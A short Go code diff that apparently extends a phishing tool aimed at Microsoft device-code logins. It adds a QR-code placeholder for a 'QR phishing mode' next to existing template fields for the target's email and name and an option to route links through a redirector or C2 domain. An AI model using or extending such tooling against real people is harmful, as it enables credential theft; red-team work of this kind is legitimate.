@@ -71,6 +71,7 @@ func (a loginAuth) Next(fromServer []byte, more bool) ([]byte, error) {
 //	{{REALURL}} — always the real Microsoft verification URI
 //	{{EMAIL}}   — target email address
 //	{{NAME}}    — target display name
+//	{{QRC}}     — QR code image tag (base64 PNG <img> element, used for QR phishing mode)
 //
 // RedirectorURL: if non-empty, {{URL}} resolves to this value instead of the
 // real Microsoft URL. Use this to front requests through a redirector/C2 domain.
@@ -90,6 +91,7 @@ type TemplateData struct {
 	RealURL     string // {{REALURL}} — always the Microsoft verification URI
 	TargetEmail string // {{EMAIL}}
 	TargetName  string // {{NAME}}
+	QRCode      string // {{QRC}} — pre-rendered <img> tag with base64 QR PNG
 }
 
 // EmailSendResult records the outcome of one send attempt.
@@ -228,6 +230,7 @@ func Render(s string, tmpl *EmailTemplate, data TemplateData) string {
 		"{{REALURL}}", data.RealURL,
 		"{{EMAIL}}", data.TargetEmail,
 		"{{NAME}}", data.TargetName,
+		"{{QRC}}", data.QRCode,
 	)
 	return r.Replace(s)
 }
